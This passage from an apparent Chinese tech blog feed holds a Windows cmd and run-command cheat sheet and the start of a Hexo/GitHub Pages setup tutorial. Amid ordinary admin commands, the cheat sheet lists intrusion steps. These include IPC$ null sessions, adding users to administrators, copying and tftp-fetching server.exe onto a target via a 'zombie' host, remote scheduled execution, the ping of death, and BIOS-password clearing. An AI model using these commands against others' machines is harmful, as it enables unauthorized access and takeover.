<li>TM任务管理器（新版） </li>  <li>taskschd.msc：任务计划程序 </li>  <li>timedate.cpl：日期和时间 </li>  <li>UserAccountControlSettings用户账户控制设置 </li>  <li>utilman：辅助工具管理器 </li>  <li>wf.msc：高级安全Windows防火墙 </li>  <li>WFS：Windows传真和扫描 </li>  <li>wiaacmgr：扫描仪和照相机向导 </li>  <li>winver：关于Windows <ol start="104">      <li>wmimgmt.msc：打开windows管理体系结构(WMI) </li>      <li>write：写字板 </li>    </ol>  </li>  <li>wscui.cpl：操作中心 </li>  <li>wscript：windows脚本宿主设置 </li>  <li>wuapp：Windows更新</li></ol><p>　　1. gpedit.msc—–组策略</p><p>　　2. sndrec32——-录音机</p><p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows  NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p><p>　　4. explorer——-打开资源管理器 </p><p>　　5. logoff———注销命令</p><p>　　6. shutdown——-60秒倒计时关机命令</p><p>　　7. lusrmgr.msc—-本机用户和组</p><p>　　8. services.msc—本地服务设置</p><p>　　9. oobe/msoobe /a—-检查XP是否激活</p><p>　　10. notepad——–打开记事本 </p><p>　　11. cleanmgr——-垃圾整理</p><p>　　12. net start messenger—-开始信使服务</p><p>　　13. compmgmt.msc—计算机管理</p><p>　　14. net stop messenger—–停止信使服务</p><p>　　15. conf———–启动netmeeting</p><p>　　16. dvdplay——–DVD播放器</p><p>　　17. charmap——–启动字符映射表</p><p>　　18. diskmgmt.msc—磁盘管理实用程序</p><p>　　19. calc———–启动计算器</p><p>　　20. dfrg.msc——-磁盘碎片整理程序</p><p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p><p>　　22. devmgmt.msc— 设备管理器 </p><p>　　23. regsvr32 /u *.dll—-停止dll文件运行</p><p>　　24. drwtsn32—— 系统医生</p><p>　　25. rononce -p—-15秒关机</p><p>　　26. dxdiag———检查DirectX信息</p><p>　　27. regedt32——-注册表编辑器 </p><p>　　28. Msconfig.exe—系统配置实用程序</p><p>　　29. rsop.msc——-组策略结果集</p><p>　　30. mem.exe——–显示内存使用情况</p><p>　　31. regedit.exe—-注册表</p><p>　　32. winchat——–XP自带局域网聊天</p><p>　　33. progman——–程序管理器</p><p>　　34. winmsd———系统信息</p><p>　　35. perfmon.msc—-计算机性能监测程序</p><p>　　36. winver———检查Windows版本</p><p>　　37. sfc /scannow—–扫描错误并复原</p><p>　　38. taskmgr—–任务管理器（2000/xp/2003</p><p>　　39. winver———检查Windows版本</p><p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p><p>　　41. wupdmgr——–windows更新程序</p><p>　　42. wscript——–windows脚本宿主设置</p><p>　　43. write———-写字板</p><p>　　44. winmsd———系统信息</p><p>　　45. wiaacmgr——-扫描仪和照相机向导</p><p>　　46. winchat——–XP自带局域网聊天</p><p>　　47. mem.exe——–显示内存使用情况</p><p>　　48. Msconfig.exe—系统配置实用程序</p><p>　　49. mplayer2——-简易widnows media player</p><p>　　50. mspaint——–画图板</p><p>　　51. mstsc———-远程桌面连接</p><p>　　52. mplayer2——-媒体播放机</p><p>　　53. magnify——–放大镜实用程序</p><p>　　54. mmc————打开控制台</p><p>　　55. mobsync——–同步命令</p><p>　　56. dxdiag———检查DirectX信息</p><p>　　57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器</p><p>　　59. utilman——–辅助工具管理器</p><p>　　60. diskmgmt.msc—磁盘管理实用程序</p><p>　　61. dcomcnfg——-打开系统组件服务</p><p>　　62. ddeshare——-打开DDE共享设置</p><p>　　110. osk————打开屏幕键盘 </p><p>　　111. odbcad32——-ODBC数据源管理器</p><p>　　112. oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令</p><p>　　66. notepad——–打开记事本</p><p>　　67. nslookup——-网络管理的工具向导</p><p>　　68. ntbackup——-系统备份和还原</p><p>　　69. narrator——-屏幕“讲述人”</p><p>　　70. ntmsmgr.msc—-移动存储管理器</p><p>　　71. ntmsoprq.msc—移动存储管理员操作请求</p><p>　　72. netstat -an—-(TC)命令检查接口</p><p>　　73. syncapp——–创建一个公文包</p><p>　　74. sysedit——–系统配置编辑器</p><p>　　75. sigverif——-文件签名验证程序</p><p>　　76. ciadv.msc——索引服务程序</p><p>　　77. shrpubw——–创建共享文件夹</p><p>　　78. secpol.msc—–本地安全策略</p><p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p><p>　　80. services.msc—本地服务设置</p><p>　　81. Sndvol32——-音量控制程序</p><p>　　82. sfc.exe——–系统文件检查器</p><p>　　83. sfc /scannow—windows文件保护</p><p>　　84. ciadv.msc——索引服务程序</p><p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）</p><p>　　86. taskmgr——–任务管理器</p><p>　　87. eventvwr——-事件查看器</p><p>　　88. eudcedit——-造字程序</p><p>　　89. compmgmt.msc—计算机管理</p><p>　　90. packager——-对象包装程序</p><p>　　91. perfmon.msc—-计算机性能监测程序</p><p>　　92. charmap——–启动字符映射表</p><p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p><p>　　94. Clipbrd——–剪贴板查看器</p><p>　　95. conf———–启动netmeeting</p><p>　　96. certmgr.msc—-证书管理实用程序</p><p>　　97. regsvr32 /u *.dll—-停止dll文件运行</p><p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持</p><p>　　99. cmd.exe——–CMD命令提示符</p><p>　　100. chkdsk.exe—–Chkdsk磁盘检查</p><p>1.磁盘操作，<br>　　fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录<br>　　fdisk  在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr  2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）<br>　　format 参数： /q 快速格式化 /u 不可恢复  /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest<br>2.目录操作<br>　　DIR  [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR  format.exe /s查找该盘的format.exe文件并报告位置<br>　　MD (MKDIR) [目录名] 创建目录 MKDIR  HELLOWORLD 创建HELLOWORLD目录<br>　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA  进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹<br>　　RD (  RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录<br>3.文件操作<br>　　删除目录及其文件： rmdir  [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s  删除C盘的qqdownload目录。<br>　　del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s  删除该目录及其下的所有内容 /q 删除前不确认<br>　　del c:\del /s /q 自动删除c盘的del目录。<br>　　copy [源文件或目录]  [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup  将d盘的pwin98的所有文件复制到c盘的presetup下。<br>　　attrib [参数][源文件或目录]  文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r  -s io.sys  执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r  +s autoexec.bat将为自动批处理文件增加以上属性。<br>4.内存操作<br>　　debug 调试内存 参数 -w [文件名] 写入二进制文件  -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01<br>　　[return] 01[return]  q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug  还可以破解硬盘保护卡等,但只可以在纯DOS下用。<br>5.分区操作<br>　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。<br>　　PQ和Acronis  Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis  Disk Director  操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。</p><p>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接</p><p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p><p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p><p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p><p>　　net use ipipc$ /del 删除IPC链接</p><p>　　net use h: /del 删除映射对方到本地的为H:的映射</p><p>　　net user 用户名　密码　/add 建立用户</p><p>　　net user guest /active:yes 激活guest用户</p><p>　　net user 查看有哪些用户</p><p>　　net user 帐户名 查看帐户的属性</p><p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p><p>　　net start 查看开启了哪些服务</p><p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p><p>　　net stop 服务名 停止某服务</p><p>　　net time 目标ip 查看对方时间</p><p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p><p>　　net view 查看本地局域网内开启了哪些共享</p><p>　　net view ip 查看对方局域网内开启了哪些共享</p><p>　　net config 显示系统网络设置</p><p>　　net logoff 断开连接的共享</p><p>　　net pause 服务名 暂停某服务</p><p>　　net send ip “文本信息” 向对方发信息</p><p>　　net ver 局域网内正在使用的网络连接类型和信息</p><p>　　net share 查看本地开启的共享</p><p>　　net share ipc$ 开启ipc$共享</p><p>　　net share ipc$ /del 删除ipc$共享</p><p>　　net share c$ /del 删除C：共享</p><p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p><p>　　net password 密码 更改系统登陆密码</p><p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p><p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p><p>　　netstat -v 查看正在进行的工作</p><p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p><p>　　netstat -s 查看正在使用的所有协议使用情况</p><p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p><p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p><p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p><p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p><p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95  98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p><p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p><p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p><p>　　del -F 文件名  加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR  <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p><p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q  可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p><p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p><p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt;  &gt;” 是重定向命令</p><p>　　at id号 开启已注册的某个计划任务</p><p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p><p>　　at id号 /delete 停止某个已注册的计划任务</p><p>　　at 查看所有的计划任务</p><p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p><p>　　finger username @host 查看最近有哪些用户登陆</p><p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p><p>　　open ip 连接到IP（属telnet登陆后的命令）</p><p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p><p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p><p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p><p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg  将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p><p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em>  复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p><p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p><p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p><p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe  登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i  则以ASCII模式（传送文本文件模式）进行传送</p><p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p><p>　　ftp ip 端口  用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p><p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway  addres，接口地址Interface</p><p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p><p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p><p>　　mem 查看cpu使用情况</p><p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p><p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p><p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p><p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p><p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p><p>　　set 显示当前所有的环境变量</p><p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p><p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p><p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p><p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p><p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p><p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p><p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p><p>　　echo 信息 在屏幕上显示出信息</p><p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p><p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p><p>　　find 文件名 查找某文件</p><p>　　title 标题名字 更改CMD窗口标题名字</p><p>　　color 颜色值  设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p><p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p><p>　　ver 在DOS窗口下显示版本信息 </p><p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p><p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p><p>　　md　目录名 创建目录</p><p>　　replace 源文件　要替换文件的目录 替换文件</p><p>　　ren 原文件名　新文件名 重命名文件名</p><p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p><p>　　type 文件名 显示文本文件的内容</p><p>　　more 文件名 逐屏显示输出文件</p><p>　　doskey 要锁定的命令=字符</p><p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey  dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p><p>　　taskmgr 调出任务管理器</p><p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p><p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p><p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p><p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p><p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p><p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p><p>　　regedit /e 注册表文件名 导出注册表</p><p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm  替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F  完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p><p>　　cacls 文件名 查看文件的访问用户权限列表</p><p>　　REM 文本内容 在批处理文件中添加注解</p><p>　　netsh 查看或更改本地网络配置情况</p><p>　　</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/5.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="cmd" scheme="http://javastar.club/categories/cmd/"/>
    
    
      <category term="cmd" scheme="http://javastar.club/tags/cmd/"/>
    
  </entry>
  
  <entry>
    <title>French</title>
    <link href="http://javastar.club/archives/a8d9cb68.html"/>
    <id>http://javastar.club/archives/a8d9cb68.html</id>
    <published>2019-08-10T02:58:02.000Z</published>
    <updated>2019-08-10T03:01:44.310Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://github.com/starstarb/clouding/raw/master/picture/7.jpg" alt></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/7.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="French" scheme="http://javastar.club/categories/French/"/>
    
    
      <category term="French" scheme="http://javastar.club/tags/French/"/>
    
  </entry>
  
  <entry>
    <title>hexo搭建博客记录</title>
    <link href="http://javastar.club/archives/5910dd1d.html"/>
    <id>http://javastar.club/archives/5910dd1d.html</id>
    <published>2019-08-10T01:27:16.000Z</published>
    <updated>2019-08-10T03:01:44.312Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo+yilia搭建属于自己的博客，新手完全教程<br><img src="https://github.com/starstarb/clouding/raw/master/picture/6.jpg" alt></p><a id="more"></a><p>##使用 Hexo 来搭建自己的个人静态博客:</p><ol>  <li>Markdown 写博客</li>  <li>Hexo 生成 HTML</li>  <li>Hexo 发布 HTML 到 Github Pages</li></ol><blockquote>  <p>留言功能选择gittalk,不需要备案。</p></blockquote><h3 id="Install-Node"><a href="#Install-Node" class="headerlink" title="Install Node"></a>Install  Node</h3><p>Hexo 需要 Node</p><ul>  <li>Mac 安装 Node，可以使用 Homebrew 安装: brew install node</li>  <li>Windows 安装 Node，进入 <a href="https://nodejs.org/en/" rel="external nofollow noopener noreferrer" target="_blank">https://nodejs.org/en/</a>    下载安装</li>  <li>ubuntu 安装 Node,终端运行：<figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><p>注意：使用这种方式安装的npm是ubuntu软件仓库中的标准本，如果需要最新版，尽可能去官网下载源码包，<a href="http://nodejs.org" rel="external nofollow noopener noreferrer" target="_blank">官网地址</a></p><p> 下载回来后，需要解压缩</p><ol>  <li>ctrl+alt+T打开ubuntu终端</li>  <li>使用cd 命令进入下载目录，输入<code>tar zxvf node-v***.tar.gz</code> * 是指node安装包的完整名称  </li>  <li>解压完成后， cd 进入 node-v*目录，目录下有configure文件。</li>  <li>输入<code>./configure</code></li>  <li>输入 <code>make</code></li>  <li>输入<code>sudo make install</code></li>  <li>检测是否安装成功:<br>输入：<figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ol><h4 id="使用-Node-的淘宝镜像"><a href="#使用-Node-的淘宝镜像" class="headerlink" title="使用 Node 的淘宝镜像"></a>使用  Node 的淘宝镜像</h4><p>由于网络的问题，访问 Node 的默认仓库有可能会很慢，很多东西都下载不下来，可以使用淘宝的 Node 的镜像，命令行里执行</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre>      </td>    </tr>  </table></figure><h3 id="Install-Github-Client"><a href="#Install-Github-Client" class="headerlink" title="Install Github Client"></a>Install  Github Client</h3><p>Hexo 和 Github 一起使用就可以搭建一个免费的博客网站<br>如果没有安装 Git，需要安装一下<br>到 <a href="https://desktop.github.com" rel="external nofollow noopener noreferrer" target="_blank">https://desktop.github.com</a>  下载 Github 客户端</p><p>使用github也有很多坑，慢慢摸索，记得搜索windows10下的github配置教程，里面很多教程会指引你配置github，这里给出一个基本教程：</p><h3 id="首先了解https-和-SSH-的区别："><a href="#首先了解https-和-SSH-的区别：" class="headerlink" title="首先了解https 和 SSH 的区别："></a>首先了解https  和 SSH 的区别：</h3><p>1、前者可以随意克隆github上的项目，而不管是谁的；而后者则是你必须是你要克隆的项目的拥有者或管理员，且需要先添加 SSH key ，否则无法克隆。</p><p>2、https url 在push的时候是需要验证用户名和密码的；而 SSH 在push的时候，是不需要输入用户名的，如果配置SSH  key的时候设置了密码，则需要输入密码的，否则直接是不需要输入密码的。</p><h4 id="在-github-上添加-SSH-key-的步骤："><a href="#在-github-上添加-SSH-key-的步骤：" class="headerlink" title="在 github 上添加 SSH key 的步骤："></a>在  github 上添加 SSH key 的步骤：</h4><ul>  <li>1、首先需要检查你电脑是否已经有 SSH    key<br>Windows10一般在这个目录下<code>C:\Users\PC_2017</code>,找到.ssh隐藏文件，打开看是否有id_rsa.pub等几个文件。<br>运行    git Bash 客户端，输入如下代码：<figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line">$ cd ~/.ssh</span><br><span class="line">$ ls</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><p>这两个命令就是检查是否已经存在 id_rsa.pub 或 id_dsa.pub 文件，如果文件已经存在，那么你可以跳过步骤2，直接进入步骤3。</p><ul>  <li>2、创建一个 SSH key <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line">$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot; 邮箱必须是你的github邮箱</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><p>代码参数含义：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">-t 指定密钥类型，默认是 rsa ，可以省略。</span><br><span class="line">-C 设置注释文字，比如邮箱。</span><br><span class="line">-f 指定密钥文件存储文件名。</span><br></pre>      </td>    </tr>  </table></figure><p>以上代码省略了 -f 参数，因此，运行上面那条命令后会让你输入一个文件名，用于保存刚才生成的 SSH key 代码，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line"># Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter]</span><br></pre>      </td>    </tr>  </table></figure><p>当然，你也可以不输入文件名，使用默认文件名（推荐），那么就会生成 id_rsa 和 id_rsa.pub 两个秘钥文件。</p><p>接着又会提示你输入两次密码（该密码是你push文件的时候要输入的密码，而不是github管理者的密码），</p><p>当然，你也可以不输入密码，直接按回车。那么push的时候就不需要输入密码，直接提交到github上了，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line"># Enter same passphrase again:</span><br></pre>      </td>    </tr>  </table></figure><p>接下来，就会显示如下代码提示，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Your identification has been saved in /c/Users/you/.ssh/id_rsa.</span><br><span class="line"># Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.</span><br><span class="line"># The key fingerprint is:</span><br><span class="line"># 01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db your_email@example.com</span><br></pre>      </td>    </tr>  </table></figure><p>当你看到上面这段代码的收，那就说明，你的 SSH key 已经创建成功，你只需要添加到github的SSH key上就可以了。</p><ul>  <li>    <p>3、添加你的 SSH key 到 github上面去</p>    <p> a、首先你需要拷贝 id_rsa.pub 文件的内容，你可以用编辑器打开文件复制，也可以用git命令复制该文件的内容，如：</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line">$ clip &lt; ~/.ssh/id_rsa.pub</span><br></pre>          </td>        </tr>      </table>    </figure>    <p> b、登录你的github账号，从又上角的设置（ Account Settings ）进入，然后点击菜单栏的 SSH key 进入页面添加 SSH      key。</p>    <p> c、点击 Add SSH key 按钮添加一个 SSH key 。把你复制的 SSH key 代码粘贴到 key 所对应的输入框中，记得 SSH      key 代码的前后不要留有空格或者回车。当然，上面的 Title 所对应的输入框你也可以输入一个该 SSH key 显示在 github      上的一个别名。默认的会使用你的邮件名称。</p>  </li></ul><ul>  <li>4、测试一下该SSH key</li></ul><p>在git Bash 中输入以下代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ ssh -T git@github.com</span><br></pre>      </td>    </tr>  </table></figure><p>当你输入以上代码时，会有一段警告代码，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">The authenticity of host &apos;github.com (207.97.227.239)&apos; can&apos;t be established.</span><br><span class="line"># RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span><br><span class="line"># Are you sure you want to continue connecting (yes/no)?</span><br></pre>      </td>    </tr>  </table></figure><p>这是正常的，你输入 yes 回车既可。如果你创建 SSH key 的时候设置了密码，接下来就会提示你输入密码，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Enter passphrase for key &apos;/c/Users/Administrator/.ssh/id_rsa&apos;:</span><br></pre>      </td>    </tr>  </table></figure><p>当然如果你密码输错了，会再要求你输入，知道对了为止。</p><p>注意：输入密码时如果输错一个字就会不正确，使用删除键是无法更正的。</p><p>密码正确后你会看到下面这段话，如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Hi username! You&apos;ve successfully authenticated, but GitHub does not</span><br><span class="line"># provide shell access.</span><br></pre>      </td>    </tr>  </table></figure><p>如果用户名是正确的,你已经成功设置SSH密钥。如果你看到 “access denied” ，者表示拒绝访问，那么你就需要使用 https 去访问，而不是  SSH 。</p><p>另外，如果出现连接失败，一般是端口22被占用，修改443端口即可，参考我的博客中记录的第三次日记。</p><p>这里提一点，参考完我的博客还是连接不上的话，记得关闭gitbash端口，等待一会重新打开，重新测试</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ ssh -T git@github.com</span><br></pre>      </td>    </tr>  </table></figure><p>很多次应该是本地环境连接的问题，关闭gitbash重新打开即可正常访问。</p><h4 id="Install-Hexo-and-initialize-Pages"><a href="#Install-Hexo-and-initialize-Pages" class="headerlink" title="Install Hexo and initialize Pages"></a>Install  Hexo and initialize Pages</h4><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span 